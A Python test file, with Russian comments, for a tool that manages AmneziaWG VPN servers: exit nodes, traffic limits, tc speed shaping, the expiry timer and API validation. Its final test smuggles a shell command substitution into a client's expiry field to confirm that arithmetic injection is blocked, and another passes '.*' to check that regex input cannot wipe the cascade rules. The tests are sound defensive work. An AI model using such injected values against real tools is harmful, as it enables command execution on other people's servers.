r = api("mimicry")
chk("api mimicry", r.get("ok") and len(r["data"]) == 9 and r["data"][0]["id"] == "quic" and r["data"][0]["domain"], r)
r = api("cascade", "add", "udp", "4443", "5.6.7.8", "443", "тест")
rule = next((x for x in api("cascade", "list").get("data") or [] if x["in"] == 4443), {})
chk("api cascade add/list", r.get("ok") and rule.get("out") == 443 and rule.get("proto") == "udp"
    and rule.get("comment") == "тест", [r, rule])
r = api("exits", "add", "n1", stdin="")
chk("stdin обязателен для exits add", r.get("ok") is False and "stdin" in r["error"], r)
r = api("exits", "add", "n1", stdin="[Interface]\nPrivateKey = X\n")
chk("конфиг ноды читается из stdin", r.get("ok") is False and "Endpoint" in r["error"], r)
# Exit-ноды: все клиенты / никто одной командой, режим без включения
EX_PEERS, EX_STATE = os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list"), os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state")
saved = [open(EX_PEERS).read(), open(EX_STATE).read()]
ips = {c["name"]: c["ip"] for c in api("clients", "list").get("data") or []}
peers = lambda: [x for x in open(EX_PEERS).read().split("\n") if x]
r = api("exits", "client", "none")
chk("exits client none — никого через ноды, режим «выбранные»", r.get("ok") and peers() == [] and "mode=peers" in open(EX_STATE).read(), [r, peers()])
api("exits", "client", "alice", "nl")
r = api("exits", "client", "all")
chk("exits client all — все клиенты, своя нода остаётся", r.get("ok") and len(peers()) == len(ips) and f"{ips['alice']}|nl" in peers(), [r, peers()])
rows = {c["name"]: c.get("exit") for c in api("clients", "list").get("data") or []}
chk("в списке клиентов — выход каждого", rows.get("alice") == "nl" and all(v == "shared" for n, v in rows.items() if n != "alice"), rows)
r = api("exits", "mode", "all")
chk("exits mode all — режим меняется", r.get("ok") and "mode=all" in open(EX_STATE).read(), r)
r = api("exits", "mode", "x")
chk("exits mode — только all|peers", r.get("ok") is False, r)
# «никто» → «все» → «alice напрямую»: список был пуст, и мимо нод уходили все
api("exits", "client", "none")
api("exits", "mode", "all")
r = api("exits", "client", "alice", "off")
chk("из «все клиенты» в «выбранные»: напрямую только alice, остальные через ноды",
    r.get("ok") and sorted(peers()) == sorted(ip for n, ip in ips.items() if n != "alice") and "mode=peers" in open(EX_STATE).read(),
    [r, peers()])
# Клиент «all»: «exits client all off» — про него, а не про всех
api("client", "add", "all", "mimicry=none")
api("exits", "client", "all")
ip_all = next(c["ip"] for c in api("clients", "list").get("data") or [] if c["name"] == "all")
r = api("exits", "client", "all", "off")
chk("клиент по имени all: со вторым аргументом — только он", r.get("ok") and ip_all not in peers() and len(peers()) == len(ips), [r, peers()])
# Туннели: то же — «tunnels client xray all off» про клиента «all»
api("tunnels", "client", "warp", "all")
r = api("tunnels", "client", "warp", "all", "off")
wl = api("tunnels", "clients", "warp").get("data") or []
chk("туннель: клиент по имени all с off — выключен только он",
    r.get("ok") and [c["name"] for c in wl if not c["on"]] == ["all"], [r, wl])
r = api("tunnels", "client", "warp", "none")
wl = api("tunnels", "clients", "warp").get("data") or []
chk("туннель: none без аргумента — все напрямую", r.get("ok") and not any(c["on"] for c in wl), wl)
api("client", "del", "all")
# Кнопка «выбранные» после «никто» и «все»: пустой список увёл бы мимо нод всех
api("exits", "client", "none")
api("exits", "mode", "all")
r = api("exits", "mode", "peers")
chk("exits mode peers после «никто» и «все» — через ноды все, а не никто",
    r.get("ok") and len(peers()) == len(ips), [r, peers()])
# …а сознательный выбор переживает «все» → «выбранные»
api("exits", "client", "none")
api("exits", "client", "bob", "shared")
api("exits", "mode", "all")
api("exits", "mode", "peers")
chk("exits mode peers возвращает прежний выбор", peers() == [ips["bob"]], peers())
with open(EX_PEERS, "w") as f:
    f.write(saved[0])
with open(EX_STATE, "w") as f:
    f.write(saved[1])
# cascade del: аргументы шли в grep -E как регулярка — «.*» вычищал весь файл правил
r = api("cascade", "del", ".*", ".*")
rules = api("cascade", "list").get("data") or []
chk("api cascade del отвергает не порт", r.get("ok") is False and any(x["in"] == 4443 for x in rules), [r, rules])
# Новый срок заблокированному клиенту возвращает адрес, а не оставляет его на 127.0.0.2
api("client", "add", "erin", "mimicry=none")
rc, out, _ = bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  'client_expire_set erin $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^erin"')
cols = out.strip().split("\t")
chk("срок заблокированному снимает блокировку", len(cols) >= 5 and cols[2].startswith("10.23.45.") and cols[4] == ""
    and cols[3].isdigit() and int(cols[3]) > 1e9, repr(out))
api("client", "del", "erin")

# ── Трафик по дням и лимиты (v1.2.0) ──
def dump_with(counters):
    pubs = {c["name"]: c["pub"] for c in api("clients", "list").get("data") or []}
    with open(AWG_DUMP, "w") as f:
        f.write("priv\tpub\t51820\toff\n")
        for n, (rx, tx) in counters.items():
            f.write(f"{pubs[n]}\t(none)\t1.2.3.4:5\t10.0.0.0/32\t0\t{rx}\t{tx}\t25\n")

def tick():
    return bash("traffic_tick 1; cat \"$TRAFFIC_DB\"")[1]

def cl(name):
    return next((c for c in api("clients", "list").get("data") or [] if c["name"] == name), {})

# Первый проход по новой базе только запоминает счётчики: накопленное до
# учёта к сегодняшнему дню не относится
bash('rm -f "$TRAFFIC_DB"')
dump_with({"alice": (1000, 2000), "bob": (10, 10)})
tick()
dump_with({"alice": (1000 + 3 * 2**20, 2000 + 2 * 2**20), "bob": (10, 10)})
db = json.loads(tick().strip().splitlines()[-1])
day = time.strftime("%Y-%m-%d")
a = cl("alice")
chk("трафик: первый проход только запоминает, второй — прирост за день",
    sum(next(iter(db["days"].values())).get(a.get("pub"), [0, 0])) == 5 * 2**20 and day in db["days"]
    and a.get("month") == 5 * 2**20 and a.get("today") == 5 * 2**20 and a.get("limit") is None, [db, a])
dump_with({"alice": (100, 100), "bob": (10, 10)})
tick()
chk("трафик: счётчик меньше прежнего (awg0 перезапущен) — отсчёт с нуля", cl("alice").get("month") == 5 * 2**20 + 200,
    cl("alice"))
r = api("client", "limit", "alice", "1M")
a = cl("alice")
chk("лимит меньше израсходованного — сразу блок", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
    and a.get("limit") == 2**20 and a.get("period") == "month" and a.get("used", 0) >= 2**20, [r, a])
rc, out, _ = bash('clients_tsv | grep "^alice"')
chk("блок за трафик: адрес в orig_ips, метка blocked_by", "127.0.0.2/32" in out and out.split("\t")[7] == "traffic",
    repr(out))
rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
chk("новый срок блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
r = api("client", "limit", "alice", "10G")
a = cl("alice")
chk("лимит выше израсходованного — разблокировка", r.get("ok") and not a.get("blocked") and a.get("ip") == "10.23.45.2"
    and a.get("limit") == 10 * 2**30, [r, a])
r = api("traffic", "daily")
d = r.get("data") or {}
chk("api traffic daily — сервер за 30 дней с разбивкой по клиентам", r.get("ok") and len(d.get("days", [])) == 30
    and d["days"][-1] == day and d.get("total") == 5 * 2**20 + 200 and d["clients"][0]["name"] == "alice", r)
al = (d.get("clients") or [{}])[0]
chk("api traffic daily — у клиента ряд по дням для мини-графика", len(al.get("d") or []) == 30
    and sum(al["d"]) == al["rx"] + al["tx"], al)
r = api("traffic", "daily", "alice", "7")
chk("api traffic daily ИМЯ ДНЕЙ", r.get("ok") and len(r["data"]["days"]) == 7 and r["data"]["name"] == "alice"
    and "clients" not in r["data"], r)
r = api("traffic", "daily", "nobody")
chk("api traffic daily — нет клиента", r.get("ok") is False, r)
db_before = bash('cat "$TRAFFIC_DB" 2>/dev/null')[1]
r = api("traffic", "now")
d = r.get("data") or {}
chk("api traffic now — счётчики клиентов по именам и время для живой скорости",
    r.get("ok") and isinstance(d.get("ts"), (int, float)) and d.get("ts") > 1e9
    and isinstance((d.get("peers") or {}).get("alice"), list) and len(d["peers"]["alice"]) == 2, r)
db_after = bash('cat "$TRAFFIC_DB" 2>/dev/null')[1]
chk("api traffic now — база трафика не пишется", db_before == db_after)
r = api("client", "limit", "alice", "2G", "total")
chk("лимит «всего» считается с этой минуты", r.get("ok") and cl("alice").get("used") == 0
    and cl("alice").get("period") == "total", cl("alice"))
dump_with({"alice": (100 + 2**20, 100), "bob": (10, 10)})
tick()
api("client", "limit", "alice", "1M", "month")
r = api("client", "limit-reset", "alice")
a = cl("alice")
chk("обнулить счётчик лимита — разблокировка до конца месяца", r.get("ok") and a.get("used") == 0 and not a.get("blocked"), a)
r = api("client", "limit", "alice", "много")
chk("лимит: размер не распознан", r.get("ok") is False and "распознан" in (r.get("error") or ""), r)
r = api("client", "limit", "alice", "5G", "week")
chk("лимит: неизвестный период", r.get("ok") is False, r)
r = api("client", "limit-reset", "bob")
chk("обнулить без лимита — ошибка", r.get("ok") is False, r)
# Истёк и срок: пока лимит исчерпан, блок держит он; отпустил лимит — блок
# переходит к сроку, и снимается уже сроком
api("client", "limit", "alice", "1K")
dump_with({"alice": (100 + 2**20 + 4096, 100), "bob": (10, 10)})
tick()
chk("превысил лимит по ходу — блок таймером", cl("alice").get("blocked_by") == "traffic", cl("alice"))
bash('py meta-set "$SERVER_CONF" alice expires 1')
tick()
a = cl("alice")
chk("истёк срок у заблокированного за трафик — блок держит лимит", a.get("blocked") and a.get("blocked_by") == "traffic", a)
r = api("client", "unexpire", "alice")
a = cl("alice")
chk("снять срок не снимает блок за трафик", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
    and a.get("expires") is None and "лимит трафика" in r.get("log", ""), [r, a])
rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
chk("новый срок после истёкшего блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
bash('py meta-set "$SERVER_CONF" alice expires 1')
# «Истёкшие» удаляют только заблокированных сроком
api("client", "add", "erin", "mimicry=none")
bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null')
# bob (истёк в начале раздела) нужен дальше — снимаем с него срок, чтобы purge его не тронул
bash('py expire-clear "$SERVER_CONF" bob "$EXPIRE_SUSPEND_IP" >/dev/null')
r = api("clients", "purge-blocked")
names = [c["name"] for c in api("clients", "list").get("data") or []]
chk("purge-blocked: истёкший удалён, заблокированный за трафик остался", r.get("ok") and "erin" not in names
    and "alice" in names, [r, names])
api("client", "limit", "alice", "off")
a = cl("alice")
chk("снятие лимита у истёкшего — блок переходит к сроку", a.get("blocked") and a.get("blocked_by") == "expire"
    and a.get("limit") is None, a)
api("client", "unexpire", "alice")
chk("снять срок — разблокировка", not cl("alice").get("blocked"), cl("alice"))
# Лимит по новой базе (база потеряна): трафик до этой минуты в лимит не идёт
bash('rm -f "$TRAFFIC_DB"')
dump_with({"alice": (50 * 2**20, 50 * 2**20)})
r = api("client", "limit", "alice", "10M")
a = cl("alice")
chk("лимит по новой базе: накопленное до учёта не считается", r.get("ok") and not a.get("blocked")
    and a.get("used") == 0, [r, a])
dump_with({"alice": (50 * 2**20 + 1000, 50 * 2**20)})
tick()
chk("лимит по новой базе: дальше — только прирост", cl("alice").get("used") == 1000, cl("alice"))
api("client", "limit", "alice", "off")
# Пустой снимок (awg0 лежит) не снимает «первый проход»
bash('rm -f "$TRAFFIC_DB"')
dump_with({})
tick()
dump_with({"alice": (7 * 2**20, 7 * 2**20)})
tick()
chk("пустой снимок: накопленное до учёта не идёт в сегодня", cl("alice").get("today") == 0, cl("alice"))
rc, out, _ = bash('ls "$EXPIRE_STATE_DIR" | grep "^transfer"')
chk("снимки счётчиков не остаются — только последний, для сторожа таймера", out.split() == ["transfer"], out)
# ── Скорость клиентов и мягкий лимит ──
print("Скорость клиентов")
with open(LINKS, "a") as f:
    f.write("awg0\n")
TCB = CALLS + ".tcbusy"
TCF = CALLS + ".tcfail"
rc, out, _ = bash("""f=$(mktemp); cat > "$f" <<'EOC'
[Interface]
PrivateKey = x

[Peer]
# s1
# speed=20
PublicKey = P1=
AllowedIPs = 10.9.0.2/32, fd00::2/128

[Peer]
# s2
# speed=50
# limit_slow=2
# slowed_by=traffic
PublicKey = P2=
AllowedIPs = 10.9.0.3/32

[Peer]
# s3
# limit_slow=5
PublicKey = P3=
AllowedIPs = 10.9.0.4/32

[Peer]
# s4
# speed=10
# orig_ips=10.9.0.5/32
PublicKey = P4=
AllowedIPs = 127.0.0.2/32

[Peer]
# s5
# speed=12x
PublicKey = P5=
AllowedIPs = 10.9.0.6/32 junk

[Peer]
# s6
# speed=²
PublicKey = P6=
AllowedIPs = 10.9.0.7/32
EOC
py speed-plan "$f" 127.0.0.2/32""")
chk("план скорости: своя скорость, замедленный — меньшее из двух, IPv6, без заблокированных и мусора (и «²»)",
    out.splitlines() == ["10.9.0.2/32\t20", "fd00::2/128\t20", "10.9.0.3/32\t2"], repr(out))
r = api("client", "speed", "alice", "20")
reset_calls()
r = api("client", "speed", "alice", "20")
c = calls()
chk("api client speed: повторно то же — tc не трогается", r.get("ok") and "tc -batch" not in c, [r, c])
api("client", "speed", "alice", "off")
reset_calls()
r = api("client", "speed", "alice", "25")
c = calls()
a = cl("alice")
ipa = a.get("ip")
chk("api client speed 25: HTB на awg0, вход — в ifb, полоса по адресу клиента в обе стороны",
    r.get("ok") and a.get("speed") == 25 and "tc> qdisc add dev awg0 root handle a2: htb default 1" in c
    and f"tc> filter add dev awg0 parent a2: protocol ip prio 1 u32 match ip dst {ipa}/32 flowid a2:2" in c
    and f"match ip src {ipa}/32 action mirred egress redirect dev awg0-ifb" in c
    and "tc> class add dev awg0-ifb parent a2: classid a2:2 htb rate 25mbit ceil 25mbit" in c
    and "ip link add awg0-ifb type ifb" in c, [r, a, c])
rc, out, _ = bash('grep -c "^# speed=25" "$SERVER_CONF"; cat "$EXPIRE_STATE_DIR/speed"')
chk("скорость — меткой у клиента в конфиге сервера; план записан", out.split("\n")[0] == "1" and f"{ipa}/32\t25" in out, out)
for bad in ("0.5", "-3", "много", "20000", "99999999"):
    r = api("client", "speed", "alice", bad)
    if r.get("ok"):
        break
chk("api client speed: не число, дробь, больше 10000 — отказ", r.get("ok") is False and "Мбит/с" in (r.get("error") or ""), [bad, r])
r = api("client", "speed", "alice", "020")
chk("api client speed «020» — 20, а не восьмеричное", r.get("ok") and cl("alice").get("speed") == 20, cl("alice"))
r = api("client", "speed", "nobody", "5")
chk("api client speed: нет клиента", r.get("ok") is False, r)
# Чужая очередь на awg0 — не трогаем
api("client", "speed", "alice", "off")
with open(TCB, "w") as f:
    f.write("qdisc cake 8001: root refcnt 2 bandwidth 100Mbit\n")
reset_calls()
r = api("client", "speed", "alice", "30")
os.remove(TCB)
chk("своя очередь tc на awg0 (поставлена руками) — не трогаем, честная ошибка",
    r.get("ok") is False and "своя очередь" in (r.get("error") or "") and "tc -batch" not in calls(), [r, calls()])
# Ядро без fq_codel — ставится sfq; без ifb и полисера — хотя бы скачивание
with open(TCF, "w") as f:
    f.write("Error: Specified qdisc kind is unknown.\n")
reset_calls()
rc, out, _ = bash('speed_apply; echo "rc=$? $SPEED_ERR"')
os.remove(TCF)
c = calls()
chk("tc отверг всё — перебраны очереди (fq_codel, sfq, pfifo) и режимы отдачи (ifb, полисер, без), ошибка с текстом tc",
    "rc=1 tc: Error: Specified qdisc kind is unknown." in out and "sfq perturb 10" in c and "pfifo limit 1000" in c
    and "police rate 30mbit" in c and c.count("tc -batch") == 9 and "tc qdisc del dev awg0 ingress" in c, [out, c[-300:]])
reset_calls()
rc, out, _ = bash('speed_apply; echo "rc=$?"; tc qdisc show dev awg0 root')
chk("после ошибки — следующий проход ставит заново", "rc=0" in out and "htb a2:" in out, out)
# Перезапуск awg0: корень снова «по умолчанию» — таймер ставит заново
reset_calls()
rc, out, _ = bash('rm -f "$CALLS.tcroot"; speed_check; tc qdisc show dev awg0 root')
chk("перезапуск awg0 (правила tc пропали) — проход таймера ставит их заново", "htb a2:" in out and "tc -batch" in calls(), out)
reset_calls()
bash('speed_check')
chk("проход таймера: ничего не изменилось — tc не трогается", "tc -batch" not in calls(), calls())
# Ограничений не осталось — правила снимаются, ifb удаляется
with open(LINKS, "a") as f:
    f.write("awg0-ifb\n")
reset_calls()
r = api("client", "speed", "alice", "off")
c = calls()
rc, out, _ = bash('ls "$EXPIRE_STATE_DIR" | grep "^speed" ; tc qdisc show dev awg0 root')
chk("speed off у последнего — tc снят (корень, вход, ifb), состояние стёрто",
    r.get("ok") and "tc qdisc del dev awg0 root" in c and "tc qdisc del dev awg0 ingress" in c
    and "ip link del awg0-ifb" in c and "noqueue" in out and "speed" not in out.split("qdisc")[0], [c, out])
reset_calls()
bash('speed_check')
chk("ограничений нет — проход таймера tc не зовёт", "tc " not in calls(), calls())
# Мягкий лимит: исчерпал — замедлен, не заблокирован
dump_with({"alice": (100, 100), "bob": (10, 10)})
tick()
r = api("client", "limit-mode", "alice", "2")
chk("api client limit-mode 2", r.get("ok") and cl("alice").get("limit_slow") == 2, [r, cl("alice")])
api("client", "limit", "alice", "1M", "total")
dump_with({"alice": (100 + 3 * 2**20, 100), "bob": (10, 10)})
reset_calls()
with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11\n')
rc, out, _ = bash('curl() { cat >> "$CALLS"; }; traffic_tick; tail -2 "$EXPIRE_LOG"')
a = cl("alice")
c = calls()
chk("мягкий лимит: исчерпал — замедлен до 2 Мбит/с, не заблокирован, админу — сообщение",
    not a.get("blocked") and a.get("slowed") and "rate 2mbit" in c and "замедлен до 2 Мбит/с" in c
    and "slow: alice до 2 Мбит/с" in out, [a, out, c[-600:]])
api("client", "speed", "alice", "1")
rc, out, _ = bash('cat "$EXPIRE_STATE_DIR/speed"')
chk("своя скорость меньше «замедления» — действует меньшая", out.strip().endswith("\t1"), out)
api("client", "speed", "alice", "off")
# Режим «блокировать» у замедленного — блок
reset_calls()
r = api("client", "limit-mode", "alice", "block")
a = cl("alice")
chk("limit-mode block у замедленного — блок вместо замедления, tc снят", r.get("ok") and a.get("blocked_by") == "traffic"
    and not a.get("slowed") and "tc qdisc del dev awg0 root" in calls(), [r, a])
# И обратно: заблокированный за трафик при «замедлять» — разблокирован и замедлен
r = api("client", "limit-mode", "alice", "5")
a = cl("alice")
chk("limit-mode 5 у заблокированного за трафик — разблокирован и замедлен до 5", r.get("ok") and not a.get("blocked")
    and a.get("slowed") and a.get("ip") == ipa, [r, a])
r = api("client", "limit-mode", "alice", "ноль")
chk("api client limit-mode: не block и не число — отказ", r.get("ok") is False, r)
# Лимит снят — снова полная скорость
reset_calls()
rc, out, _ = bash('curl() { cat >> "$CALLS"; }; client_limit_set alice off >/dev/null; tail -1 "$EXPIRE_LOG"')
a = cl("alice")
chk("лимит снят — замедление снято, сообщение «снова полная скорость», tc снят",
    not a.get("slowed") and "unslow: alice" in out and "снова полная скорость" in calls()
    and "tc qdisc del dev awg0 root" in calls(), [a, out])
os.remove(os.path.join(ROOT, "bot.conf"))
# Скрипт таймера несёт функции скорости
api("client", "speed", "bob", "7")
bash('rm -f "$CALLS.tcroot"')
reset_calls()
r = subprocess.run(["bash", SCR("EXPIRE_BIN")], capture_output=True, text=True, timeout=60, cwd="/",
                   env={k: v for k, v in ENV.items() if k in ("PATH", "CALLS", "LINKS", "ACTIVE", "IPT_SAVE", "AWG_DUMP")})
chk("скрипт таймера: правила скорости ставит сам, без ошибок", r.returncode == 0 and not r.stderr.strip()
    and "rate 7mbit" in calls(), [r.stderr[-400:], calls()[-400:]])
rc, out, _ = bash('clients_tsv | grep "^bob" | cut -f9')
chk("clients_tsv: скорость — 9-й столбец", out.strip() == "7", repr(out))
api("client", "limit-mode", "alice", "block")
api("client", "speed", "bob", "off")
with open(LINKS) as f:
    links = f.read()
with open(LINKS, "w") as f:
    f.write(links.replace("awg0\n", "", 1).replace("awg0-ifb\n", ""))
# Счётчики — к прежним: дальше тесты считают прирост от них
dump_with({"alice": (100, 100), "bob": (10, 10)})
tick()
# Размер лимита: «500B» — не 500 ГБ; переполнение и не-ASCII цифры — ошибка
rc, out, _ = bash('for v in 500B 500iB 2000000T 9999999T "١٢G" 0.0001K; do py size-parse "$v" >/dev/null 2>&1 && echo "$v"; done; '
                  'for v in 500MB 1.5T 50 2GiB 1024T; do py size-parse "$v" >/dev/null 2>&1 || echo "!$v"; done')
chk("размер лимита: B без единицы, > 1 ПБ, не-ASCII — отказ", out.strip() == "", repr(out))
# traffic daily: имя клиента из цифр — это имя, а не число дней
api("client", "add", "2024", "mimicry=none")
r = api("traffic", "daily", "2024", "7")
chk("api traffic daily ИМЯ-ЧИСЛО ДНЕЙ", r.get("ok") and r["data"]["name"] == "2024" and len(r["data"]["days"]) == 7
    and "clients" not in r["data"], r)
r = api("traffic", "daily", "all", "7")
chk("api traffic daily all ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 7, r)
r = api("traffic", "daily", "14")
chk("api traffic daily ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 14, r)
api("client", "del", "2024")
# Таймер ждёт замок API: конфиг не правится одновременно с вызовом из бота
api("client", "add", "frank", "mimicry=none")
rc, out, _ = bash('mkdir -p "$STATE_DIR"; exec 7>>"$STATE_DIR/api.lock"; flock 7; '
                  'py meta-set "$SERVER_CONF" frank expires 1; touch -d "-10 min" "$EXPIRE_STATE_DIR/transfer"; '
                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
                  'echo "age=$(( $(date +%s) - $(stat -c %Y "$EXPIRE_STATE_DIR/transfer") ))"')
chk("таймер: замок API занят — проход пропущен, но сторож видит, что таймер жив",
    "\t127.0.0.2/32\t" not in out and int(re.search(r"age=(-?\d+)", out).group(1)) < 60, repr(out))
# Долгая задача API: замок занят дольше EXPIRE_LOCK_MAX — проход идёт без него
rc, out, _ = bash('exec 7>>"$STATE_DIR/api.lock"; flock 7; touch -d "-5 min" "$EXPIRE_STATE_DIR/lock_busy"; '
                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
                  '[[ -f "$EXPIRE_STATE_DIR/lock_busy" ]] && echo BUSY-MARK')
chk("таймер: замок занят дольше 2 минут — сроки не ждут, проход идёт", "\t127.0.0.2/32\t" in out, repr(out))
bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; rm -f "$EXPIRE_STATE_DIR/lock_busy"; '
     'py meta-set "$SERVER_CONF" frank expires 1')
# Сообщения в Telegram — после замка: иначе медленный Telegram держал бы замок API
with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\n')
SENT = os.path.join(TMP, "notify-lock")
rc, out, _ = bash(f'curl() {{ cat >/dev/null; flock -n "$STATE_DIR/api.lock" true && echo FREE >> "{SENT}" || echo HELD >> "{SENT}"; }}; '
                  'expire_check_run; clients_tsv | grep "^frank"')
sent = open(SENT).read().split() if os.path.exists(SENT) else []
# Telegram не отвечает: рассылка не дольше бюджета, остаток — в журнале
bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; py meta-set "$SERVER_CONF" frank expires 1')
rc, out2, _ = bash(f'curl() {{ cat >/dev/null; echo X >> "{SENT}.2"; }}; EXPIRE_NOTIFY_BUDGET=0 expire_check_run; tail -1 "$EXPIRE_LOG"')
os.remove(os.path.join(ROOT, "bot.conf"))
chk("уведомления: бюджет времени исчерпан — дальше не шлём, в журнале сколько не ушло",
    not os.path.exists(SENT + ".2") and "не отправлено 1" in out2, out2)
chk("таймер: замок свободен — проход идёт; сообщения админам — уже без замка API",
    "\t127.0.0.2/32\t" in out and sent and set(sent) == {"FREE"}, [repr(out), sent])
api("client", "del", "frank")
rc, out, _ = bash("traffic_tick; cat $EXPIRE_LOG | tail -3")
# Блок за трафик делает скрипт таймера на диске, а не awg2: тот же сценарий через него
api("client", "limit", "alice", "1M", "total")
dump_with({"alice": (100 + 3 * 2**20, 100), "bob": (10, 10)})
# Окружение как у службы systemd: без HOME, USER, TERM, локали
reset_calls()
r = subprocess.run(["bash", SCR("EXPIRE_BIN")], capture_output=True, text=True, timeout=60, cwd="/",
                   env={k: v for k, v in ENV.items() if k in ("PATH", "CALLS", "LINKS", "ACTIVE", "IPT_SAVE", "AWG_DUMP")})
chk("скрипт таймера в окружении systemd — без ошибок", r.returncode == 0 and not r.stderr.strip()
    and "awg show awg0 transfer" in calls(), [r.returncode, r.stderr[-400:]])
chk("превысил лимит — блок скриптом таймера", cl("alice").get("blocked_by") == "traffic", cl("alice"))
with open(os.path.join(ROOT, "units", "awg2-expire.timer")) as f:
    unit = f.read()
chk("таймер сроков: каждые 15 с по часам, без Persistent и отсчёта от прошлого запуска",
    "OnCalendar=*-*-* *:*:00/15" in unit and "AccuracySec=1s" in unit and "Persistent" not in unit
    and "OnUnitActiveSec" not in unit, unit)
with open(os.path.join(ROOT, "units", "awg2-expire.service")) as f:
    chk("служба таймера: без «Starting/Finished» в журнале каждые 15 с", "LogLevelMax=notice" in f.read())
reset_calls()
bash('touch -d "-10 min" "$EXPIRE_STATE_DIR/transfer"; EXPIRE_STALE=300 expire_watchdog')
c = calls()
chk("сторож: таймер молчит 10 минут — ставит заново, перезапускает и сразу делает проход",
    "systemctl restart awg2-expire.timer" in c and "systemctl start --no-block awg2-expire.service" in c, c)
with open(os.path.join(ROOT, "expire.log")) as f:
    chk("сторож: запись в журнале сроков", "watchdog: таймер молчал" in f.read())
reset_calls()
bash('EXPIRE_STALE=300 expire_watchdog')
chk("сторож: таймер жив — не трогает", "awg2-expire" not in calls(), calls())
reset_calls()
bash('systemctl() { echo "systemctl $*" >> "$CALLS"; [[ "$1" == show ]] && echo "$ST"; return 0; }; '
     'ST=elapsed timer_heal awg2-expire.timer; ST=waiting timer_heal awg2-expire.timer; ST=running timer_heal awg2-expire.timer')
chk("заглохший таймер (elapsed) перезапускается, рабочий — не трогается",
    calls().count("systemctl restart awg2-expire.timer") == 1, calls())
# Перезагрузка модуля (module all / update / reload): rmmod не отдал модуль —
# туннели, остановленные перед ним, поднимаются обратно, а не лежат до ручного старта
RMBIN = os.path.join(TMP, "rmmodbin")
os.makedirs(RMBIN, exist_ok=True)
for name, body in (("rmmod", 'echo "rmmod $*" >> "$CALLS"; echo "rmmod: ERROR: Module amneziawg is in use" >&2; exit 1'),
                   ("systemctl", 'echo "systemctl $*" >> "$CALLS"\n'
                                 '[[ "$1" == list-units ]] && echo "awg-quick@awg0.service loaded active running x"\nexit 0')):
    with open(os.path.join(RMBIN, name), "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(os.path.join(RMBIN, name), 0o755)
reset_calls()
rc, out, _ = bash(f'PATH="{RMBIN}:$PATH"; unset SSH_CONNECTION; AUTO_MODE=1; mod_reload 2>&1; echo "rc=$?"')
c = calls()
chk("перезагрузка модуля: rmmod не выгрузил — туннели снова запущены, ошибка сказана",
    "systemctl stop awg-quick@awg0.service" in c and "rmmod amneziawg" in c
    and c.rfind("systemctl start awg-quick@awg0.service") > c.find("rmmod amneziawg") >= 0
    and "rc=1" in out and "rmmod не выгрузил" in out, [c, out])
api("client", "limit", "alice", "off")
os.remove(AWG_DUMP)
# Предупреждение о длине I1-I5 — по каждому клиенту отдельно, не суммой по всем
for n in ("l1", "l2"):
    with open(os.path.join(ROOT, "root", f"{n}_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1000 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: два клиента по 2 КБ — без предупреждения", "длиннее" not in out, out)
with open(os.path.join(ROOT, "root", "l3_awg2.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1850 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: один клиент на 3.7 КБ — предупреждение", "длиннее" in out, out)
for n in ("l1", "l2", "l3"):
    os.remove(os.path.join(ROOT, "root", f"{n}_awg2.conf"))
# json-rows/json-list делят только по \n: U+2028 и \r внутри значения — не новая строка
rc, out, _ = bash("printf 'n\\tx\\tc1\\xe2\\x80\\xa8c2\\r\\n' | py json-rows name ip on")
chk("json-rows: U+2028 и \\r не режут строку", json.loads(out) == [{"name": "n", "ip": "x", "on": "c1\u2028c2"}], out)
rfd, wfd = os.pipe()          # пишущий конец держим открытым до конца вызова
try:
    out = subprocess.run([API_WRAP, "version"], stdin=rfd, capture_output=True, text=True,
                         env=ENV, timeout=60).stdout
except subprocess.TimeoutExpired:
    out = "завис на чтении stdin"
os.close(rfd)
os.close(wfd)
chk("открытый stdin не блокирует команду", '"ok": true' in out, out)
r = api("frobnicate")
chk("неизвестная команда — rc 2", r.get("ok") is False and r["rc"] == 2, r)
r = api("server", "proto", "9.9")
chk("проверка аргументов", r.get("ok") is False and r["rc"] == 2 and "server proto" in r["error"], r)

# Срок клиента приходит от бота и панели — в арифметику bash не должна попасть
# подстановка команды: «expire=+0+a[$(…)]d» раньше выполняла touch.
PWNED = os.path.join(TMP, "PWNED_TS")
r = api("client", "add", "victim", f"expire=+0+a[$(touch {PWNED})]d", "mimicry=none")
chk("срок: инъекция в арифметику отбита", r.get("ok") is False and not os.path.exists(PWNED)
    and "не распознан" in (r.get("error") or ""), r)
